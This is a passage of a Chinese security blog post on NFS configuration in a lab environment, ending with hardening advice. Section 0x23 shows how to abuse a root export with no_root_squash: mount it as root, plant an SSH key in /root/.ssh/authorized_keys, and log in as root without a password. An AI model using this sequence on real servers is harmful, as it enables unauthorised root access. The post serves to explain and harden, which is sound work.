+<p>0x20 如果你只是想临时挂下共享目录,完全也可以一句话开启,没必要非去改配置文件[ 防火墙在封闭的内网环境中可以不用,有性能损耗]:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> exportfs -o rw,sync,all_squash 192.168.4.0/24:/data/music/   配置参数跟配置文件中的是一模一样的,只适合临时共享下,重启nfs即失效</span></div><div class="line"><span class="meta">#</span><span class="bash"> showmount -e 192.168.4.2</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount -t nfs 192.168.4.2:/data/music/ /mnt/data/music/</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount</span></div></pre></td></tr></table></figure></p>
+<p>0x21 大型架构可能会考虑NFS集群,更大型的架构也可能会选择使用分布式文件系统,如 MFS GlusterFS FastDFS</p>
+<p>0x22 简单分析nfs日志:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> grep <span class="string">"nfs"</span> /var/<span class="built_in">log</span>/messages</span></div></pre></td></tr></table></figure></p>
+<p>0x23 如何最大化利用NFS错误配置:</p>
+<p>假设现在我们NFS服务端的配置是这样的,特别注意下这里的共享目录的权限设置为 <code>no_root_squash</code>, 在前面咱们也已经说明了该选项的作用,通俗点儿讲就是如果客户端是以root身份来访问共享目录的,就以root的身份来操作此共享目录,再来看我共享的是什么,没错,我直接把整个根都共享出去了,也就说根下的所有文件都可以随意操作<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># vi /etc/exports</div><div class="line">  /    <span class="number">192.168</span><span class="number">.4</span><span class="number">.0</span>/<span class="number">24</span>(rw,sync,no_root_squash)</div><div class="line"># exportfs -rv</div><div class="line"># showmount -e <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/RPCServer Error.png" alt=""><br><img src="/img/RPCServer Error res.png" alt=""></p>
+<p>现在,我们再回到NFS客户端以root身份登陆到NFS客户端系统中,然后尝试挂载,说到这里,您应该知道这意味着什么了,意思就是我现在只要挂上去就可以随意操作控制目标系统,如下图所示,虽然,实战中遇到直接把整个根都共享出去的情况并不多[这样的傻缺也可能会越来越少],如果是一些放有重要信息的敏感目录,即使没法直接拿到你的系统权限,但从这些重要目录文件中拿到的各类敏感信息一样不容小觑,比较简单,废话就到此为止,相信大家现在应该非常熟练了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> mkdir /mnt/shell</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount -t nfs 192.168.4.2:/ /mnt/shell/</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount</span></div><div class="line"><span class="meta">#</span><span class="bash"> mkdir /mnt/shell/root/.ssh	如果root目录下没有.ssh目录,就自己手工创建一个</span></div><div class="line"><span class="meta">#</span><span class="bash"> ssh-keygen			一路回车,空密码</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat .ssh/id_rsa.pub &gt;&gt; /mnt/shell/root/.ssh/authorized_keys	把公钥丢过去</span></div><div class="line"><span class="meta">#</span><span class="bash"> ssh root@192.168.4.2 -p 22	直接无需密码远程ssh上去即可</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/RPCServer Error mount.png" alt=""><br><img src="/img/RPCServer Error mount res.png" alt=""></p>
+<p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;严格把控NFS服务端共享目录在本地文件系统中的权限,压缩NFS服务用户权限,严格控制挂载选项,做到这些,基本就差不多了,另外,如果没有实际业务需求,尽量不要直接把NFS暴露在公网</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/演练环境搭建/">#演练环境搭建</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/klion.png" with="262" height="254" alt="klionsec" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="/img/xiaomi.png" with="260" height="257">
+<br><br>
+<br><font color="yellow" size="4">
+如果觉得内容还不错,也希望您能高抬贵手帮忙转发一下,让更多需要的人都能看到,本人不胜感激
+</font><br><br>
+<font color="#00FF7F" size="4">
+相信您的支持和鼓励换来的将会是更高质量的不懈创作,本人将一直秉承博客初衷,坚持高质量原创实用干货分享</font>
+<br><br><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">博客累计访问量 <span id="busuanzi_value_site_pv"></span> </span>
+<span id="busuanzi_container_site_uv">
+累计访客数 <span id="busuanzi_value_site_uv"></span> 
+</span>
+<span id="showDays"></span>
+<script>
+var birthDay = new Date("12/28/2014");
+var now = new Date();
+var duration = now.getTime() - birthDay.getTime(); 
+var total= Math.floor(duration / (1000 * 60 * 60 * 24));
+document.getElementById("showDays").innerHTML = " 其实,博客已默默独自坚挺了 "+total+" 天";
+</script>
+<br>
+<br>
+多年实战渗透经验积累[大中小型网络] + 娴熟的底层及脚本编写能力 + 熟练的协议分析能力 + 多个大中型安全架构实际设计部署经验 + 良好的逆向分析能力[一定的0day挖掘能力] = 合格安全架构师
+<br>
+<br>
+<br>
+<font size=6 color="white">唯一不变的,就是一直在变</font>
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/klionsec">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="http://www.jianshu.com/u/2a4d8b1f03e0">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.zhihu.com/people/klionsec/activities">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:klion@protonmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    <strong><font size=4 color=#00FF7F> Blog by klionsec </font></strong>
+                </div>
+            </div>
+        </div>
+    </div>
+<!--
+<audio autoplay="autoplay" width="300" height="200">
+	<source src="/img/Bandari - Childhood Memory.mp3" type="audio/mpeg" />
+</audio>
+-->
+</footer>
+
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
